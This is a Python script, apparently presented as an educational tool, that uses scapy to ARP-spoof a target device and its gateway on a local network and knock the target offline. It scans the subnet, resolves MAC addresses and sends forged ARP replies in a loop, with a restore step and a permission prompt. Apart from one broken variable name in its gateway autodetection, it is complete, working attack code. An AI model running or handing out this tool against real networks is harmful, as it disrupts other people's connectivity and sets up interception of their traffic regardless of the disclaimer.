#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Network Kicker - Enhanced ARP Spoofing Tool (Educational Use Only)

This tool demonstrates ARP spoofing to temporarily disconnect a target
from the local network. It includes safety features like automatic
ARP table restoration and input validation.
"""

import os
import sys
import argparse
import logging
import signal
import time
from scapy.all import ARP, send, srp, Ether, get_if_addr, conf
import ipaddress

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("network_kicker.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Global flag for graceful shutdown
running = True

def signal_handler(sig, frame):
    global running
    logger.info(" Interrupción recibida. Restaurando tablas ARP...")
    running = False

def is_root():
    return os.geteuid() == 0

def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def get_default_gateway():
    """Intenta descubrir la IP del gateway usando la interfaz activa."""
    try:
        from scapy.arch import get_if_addr
        from scapy.layers.l2 import arping
        # Obtiene la IP de la interfaz principal
        local_ip = get_if_addr(conf.iface)
        if not local_ip:
            return None
        # Calcula la red local
        net = ipaddress.IPv4Network(f"{local_at}/24", strict=False)
        gateway_ip = str(net.network_address + 1)
        return gateway_ip
    except Exception as e:
        logger.debug(f"No se pudo autodetectar gateway: {e}")
        return None

def scan_network(interface, timeout=2):
    """Escanea la red local y muestra hosts activos."""
    logger.info("Escaneando red... esto puede tardar unos segundos.")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), 
                     timeout=timeout, iface=interface, verbose=False)
        hosts = [(res[1].psrc, res[1].hwsrc) for res in ans]
        logger.info("Dispositivos encontrados:")
        for ip, mac in hosts:
            logger.info(f"  {ip} - {mac}")
        return hosts
    except Exception as e:
        logger.error(f"Error al escanear la red: {e}")
        return []

def get_mac(ip, interface, timeout=2):
    """Obtiene la dirección MAC de una IP mediante ARP."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=timeout, iface=interface, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        else:
            logger.error(f"No se pudo resolver la MAC para {ip}. ¿Está en la red?")
            return None
    except Exception as e:
        logger.error(f"Error al obtener MAC de {ip}: {e}")
        return None

def spoof(target_ip, target_mac, spoof_ip, iface):
    """Envía un paquete ARP spoofing."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=iface, verbose=False)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface, count=5):
    """Restaura la tabla ARP enviando paquetes legítimos."""
    logger.info("Restaurando tablas ARP...")
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), 
         iface=iface, count=count, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), 
         iface=iface, count=count, verbose=False)
    logger.info("Tablas ARP restauradas.")

def main():
    global running
    parser = argparse.ArgumentParser(
        description="Network Kicker - Herramienta educativa de ARP Spoofing",
        epilog="USO ÉTICO: Solo en redes con permiso explícito."
    )
    parser.add_argument("--target", required=True, help="IP del dispositivo a desconectar")
    parser.add_argument("--gateway", help="IP del gateway/router (autodetectado si no se especifica)")
    parser.add_argument("--interface", default=conf.iface, help="Interfaz de red a usar (ej. eth0, wlan0)")
    parser.add_argument("--scan", action="store_true", help="Escanear red antes de atacar")
    parser.add_argument("--restore", action="store_true", help="Restaurar ARP tras la ejecución")
    parser.add_argument("--count", type=int, default=10, help="Número de paquetes ARP a enviar (0 = continuo)")
    parser.add_argument("--interval", type=float, default=1.0, help="Intervalo entre paquetes (segundos)")
    parser.add_argument("--verbose", action="store_true", help="Modo detallado")
    
    args = parser.parse_args()

    if not args.verbose:
        logger.setLevel(logging.WARNING)

    # Verificación de root
    if not is_root():
        logger.error("Este script debe ejecutarse como root.")
        sys.exit(1)

    # Advertencia ética
    print("\n⚠️  ADVERTENCIA ÉTICA Y LEGAL")
    print("Este script es solo para uso educativo en redes que controlas o tienes permiso para probar.")
    print("El uso no autorizado puede ser ilegal y causar daños reales.")
    confirm = input("¿Confirmas que tienes permiso para usar esta herramienta? (sí/no): ").strip().lower()
    if confirm not in ("sí", "si", "yes", "y"):
        print("Operación cancelada por el usuario.")
        sys.exit(0)

    # Validación de IP objetivo
    if not validate_ip(args.target):
        logger.error("IP objetivo inválida.")
        sys.exit(1)

    # Selección de gateway
    gateway_ip = args.gateway
    if not gateway_ip:
        logger.info("Detectando gateway automáticamente...")
        gateway_ip = get_default_gateway()
        if not gateway_ip:
            logger.error("No se pudo detectar el gateway. Especifícalo con --gateway.")
            sys.exit(1)
        logger.info(f"Gateway detectado: {gateway_ip}")

    if not validate_ip(gateway_ip):
        logger.error("IP del gateway inválida.")
        sys.exit(1)

    # Escaneo opcional
    if args.scan:
        scan_network(args.interface)

    # Obtener MACs
    logger.info("Obteniendo direcciones MAC...")
    target_mac = get_mac(args.target, args.interface)
    gateway_mac = get_mac(gateway_ip, args.interface)
    
    if not target_mac or not gateway_mac:
        logger.error("No se pudieron obtener ambas direcciones MAC. Abortando.")
        sys.exit(1)

    logger.info(f"Objetivo: {args.target} ({target_mac})")
    logger.info(f"Gateway: {gateway_ip} ({gateway_mac})")

    # Configurar señal de interrupción
    signal.signal(signal.SIGINT, signal_handler)

    # Ejecutar ataque
    logger.info("Iniciando ARP spoofing...")
    sent_packets = 0
    try:
        while running:
            spoof(args.target, target_mac, gateway_ip, args.interface)
            spoof(gateway_ip, gateway_mac, args.target, args.interface)
            sent_packets += 2
            if args.count > 0 and sent_packets >= args.count * 2:
                break
            if args.count == 0 or args.count > 1:
                time.sleep(args.interval)
    except Exception as e:
        logger.error(f"Error durante el spoofing: {e}")
    finally:
        if args.restore and running:
            restore_arp(args.target, target_mac, gateway_ip, gateway_mac, args.interface)
        elif not running:
            restore_arp(args.target, target_mac, gateway_ip, gateway_mac, args.interface)
        logger.info("Ejecución finalizada.")

if __name__ == "__main__":
    main()